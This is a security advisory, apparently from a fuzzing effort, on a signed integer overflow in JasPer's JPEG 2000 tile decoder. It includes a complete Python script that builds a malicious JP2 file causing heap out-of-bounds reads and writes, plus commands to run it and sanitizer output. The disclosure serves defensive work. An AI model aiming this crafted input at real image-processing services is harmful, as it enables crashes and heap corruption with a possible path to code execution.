## Bug0: Signed Integer Overflow in jpc_dec_tileinit numprcs Computation Leads to Heap Out-of-Bounds Read and Write

In `jpc_dec_tileinit()` in `jpc_dec.c` at line 777, the product `rlvl->numhprcs * rlvl->numvprcs` is computed as a signed 32-bit integer with no overflow check, so a crafted JP2 file with a 65537x65537 single-tile image and 1x1-pixel explicit precincts causes the product to wrap from 4,295,098,369 to 131,073, resulting in severely under-allocated `band->prcs` and `prclyrnos` heap buffers that are subsequently accessed out-of-bounds during RPCL packet iteration.

### PoC

Craft a malicious JP2 file using the Python script below and process it with the ASAN-instrumented imginfo binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def u8(v):
    return struct.pack(">B", v)

def u16(v):
    return struct.pack(">H", v)

def u32(v):
    return struct.pack(">I", v)

def make_box(box_type, data):
    total_len = 8 + len(data)
    return struct.pack(">I", total_len) + box_type.encode() + data

def build_jp2():
    sig_box = b'\x00\x00\x00\x0C\x6A\x50\x20\x20\x0D\x0A\x87\x0A'

    ftyp_data = b'jp2 ' + b'\x00\x00\x00\x00' + b'jp2 '
    ftyp_box = make_box('ftyp', ftyp_data)

    ihdr_data = (
        u32(65537) + u32(65537) + u16(1) + u8(7) + u8(7) + u8(0) + u8(0)
    )
    ihdr_box = make_box('ihdr', ihdr_data)

    colr_data = u8(1) + u8(0) + u8(0) + u32(17)
    colr_box = make_box('colr', colr_data)

    jp2h_box = make_box('jp2h', ihdr_box + colr_box)

    soc = b'\xFF\x4F'

    siz_payload = (
        u16(0)
        + u32(65537) + u32(65537)
        + u32(0) + u32(0)
        + u32(65537) + u32(65537)
        + u32(0) + u32(0)
        + u16(1)
        + u8(7) + u8(1) + u8(1)
    )
    siz = b'\xFF\x51' + u16(2 + len(siz_payload)) + siz_payload

    # Scod=0x01 (explicit precincts), ProgOrder=0x02 (RPCL), numLayers=1, MCT=0
    # numdlvls=0 (1 resolution level), xcb=2, ycb=2, cblkstyle=0, Cmodes=0
    # precinct_size=0x00 => prcwidthexpn=prcheightexpn=0 => 1x1 pixel precincts
    # numhprcs=numvprcs=65537 => numprcs=65537*65537=4295098369 => OVERFLOW => 131073
    cod_payload = (
        u8(0x01)
        + u8(0x02) + u16(1) + u8(0)
        + u8(0) + u8(2) + u8(2) + u8(0) + u8(0)
        + u8(0x00)
    )
    cod = b'\xFF\x52' + u16(2 + len(cod_payload)) + cod_payload

    # QCD required for jpc_dec_cp_isvalid: NOQNT, 1 band, exponent=8
    qcd = b'\xFF\x5C' + u16(4) + u8(0x20) + u8(0x40)

    # 150000 zero bytes: ~131073 empty packets before OOB at prcno=131073
    tile_data = b'\x00' * 150000
    sod = b'\xFF\x93'
    psot = 12 + 2 + len(tile_data)
    sot_payload = u16(0) + u32(psot) + u8(0) + u8(1)
    sot = b'\xFF\x90' + u16(2 + len(sot_payload)) + sot_payload
    eoc = b'\xFF\xD9'

    codestream = soc + siz + cod + qcd + sot + sod + tile_data + eoc
    cs_box = make_box('jp2c', codestream)

    return sig_box + ftyp_box + jp2h_box + cs_box

if __name__ == '__main__':
    data = build_jp2()
    with open('poc_input.jp2', 'wb') as f:
        f.write(data)
    print(f"Generated poc_input.jp2 ({len(data)} bytes)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo --max-samples 0 -f poc_input.jp2 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** runtime error: signed integer overflow: 65537 * 65537 cannot be represented in type 'int'
    #0 jpc_dec_tileinit (jpc_dec.c:777)
    #1 jpc_dec_process_sod
imginfo: jpc_t2cod.c:305: jpc_pi_nextrpcl: Assertion `pi->prcno < pi->pirlvl->numprcs' failed.

### Impact

An attacker can supply a crafted JP2 file that causes a signed integer overflow in `jpc_dec_tileinit()`, leading to severe under-allocation of heap buffers followed by out-of-bounds write to `pirlvl->prclyrnos` and out-of-bounds read from `band->prcs` at an attacker-controlled index. This attack surface is exposed to any process or service that invokes `imginfo` or links against libjasper to process untrusted JP2 input. The out-of-bounds write can corrupt heap metadata or adjacent allocations, providing a realistic path to arbitrary code execution, while the out-of-bounds read can leak heap addresses to assist ASLR bypass.
